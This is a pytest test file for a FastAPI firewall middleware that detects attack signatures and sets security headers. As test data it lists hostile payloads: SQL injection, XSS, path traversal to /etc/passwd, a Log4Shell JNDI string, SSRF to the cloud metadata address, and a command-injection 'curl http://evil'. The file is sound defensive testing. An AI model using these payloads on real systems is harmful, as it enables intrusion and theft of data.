from __future__ import annotations

import pytest
from fastapi import FastAPI, Request
from fastapi.testclient import TestClient

from app.core import firewall
from app.core.firewall import FirewallMiddleware, SecurityHeadersMiddleware, inspect_request


@pytest.mark.parametrize(
    "path,query,rule",
    [
        ("/api/v1/licitaciones", "q=1' OR '1'='1", "sqli_tautology"),
        ("/api/v1/licitaciones", "q=x UNION ALL SELECT password FROM users", "sqli_union"),
        ("/api/v1/licitaciones", "q=1;DROP TABLE users", "sqli_comment"),
        ("/api/v1/licitaciones", "q=pg_sleep(10)", "sqli_functions"),
        ("/api/v1/search", "q=<script>alert(1)</script>", "xss_script"),
        ("/api/v1/search", "q=%253Cscript%253E", "xss_script"),  # double-encoded
        ("/api/v1/search", "q=<img src=x onerror=alert(1)>", "xss_script"),
        ("/api/v1/documents/../../etc/passwd", "", "path_traversal"),
        ("/api/v1/search", "q=${jndi:ldap://evil/a}", "log4shell"),
        ("/api/v1/search", "q={{7*7}}", "template_injection"),
        ("/api/v1/search", "url=http://169.254.169.254/latest/meta-data", "ssrf_metadata"),
        ("/.env", "", "sensitive_files"),
        ("/api/v1/search", "q=x; curl http://evil", "command_injection"),
    ],
)
def test_attack_signatures_are_detected(path, query, rule) -> None:
    assert inspect_request(path, query, "Mozilla/5.0") == rule


@pytest.mark.parametrize(
    "query",
    [
        "q=sillas de ruedas",
        "q=Construcción y mantención de obras civiles",
        "segmento=cat:health&limit=10&sort_by=monto_total",
        "rubro=Servicios / Construcción / Obras civiles",
        "q=O'Higgins",
        "q=76.123.456-7",
        "q=ortopedia & rehabilitación",
        "cursor=eyJkIjoibmV4dCIsImkiOjE3OH0.TVQ4OHayh1RAvgHjlIdD1_qd6KLtMH6r2SJszx9hG9Y",
    ],
)
def test_legitimate_searches_are_not_blocked(query) -> None:
    assert inspect_request("/api/v1/licitaciones", query, "Mozilla/5.0") is None


def test_scanner_user_agents_are_blocked() -> None:
    assert inspect_request("/api/v1/health", "", "sqlmap/1.7.2#stable") == "scanner_user_agent"


def _app() -> FastAPI:
    test_app = FastAPI()

    @test_app.get("/api/v1/ping")
    async def ping() -> dict:
        return {"ok": True}

    @test_app.post("/api/v1/echo")
    async def echo(request: Request) -> dict:
        return {"size": len(await request.body())}

    test_app.add_middleware(FirewallMiddleware)
    test_app.add_middleware(SecurityHeadersMiddleware)
    return test_app


@pytest.fixture
def client(monkeypatch) -> TestClient:
    async def never_banned(self, ip):  # no Redis in unit tests
        return False

    async def no_strike(self, *args, **kwargs):
        return None

    monkeypatch.setattr(firewall.FirewallMiddleware, "_is_banned", never_banned)
    monkeypatch.setattr(firewall.FirewallMiddleware, "_strike", no_strike)
    return TestClient(_app())


def test_clean_request_passes_with_security_headers(client) -> None:
    response = client.get("/api/v1/ping")

    assert response.status_code == 200
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["x-frame-options"] == "DENY"
    assert "frame-ancestors 'none'" in response.headers["content-security-policy"]
    assert response.headers["cache-control"] == "no-store"
    assert "server" not in response.headers


def test_malicious_request_is_blocked_before_reaching_the_app(client) -> None:
    response = client.get("/api/v1/ping", params={"q": "1' OR '1'='1"})

    assert response.status_code == 403
    assert response.json()["error"]["code"] == "REQUEST_BLOCKED"
    assert response.headers["x-frame-options"] == "DENY"


def test_oversized_body_is_rejected(client) -> None:
    response = client.post("/api/v1/echo", content=b"x" * (1_048_576 + 1))

    assert response.status_code == 413


def test_disallowed_method_is_rejected(client) -> None:
    assert client.request("TRACE", "/api/v1/ping").status_code == 405
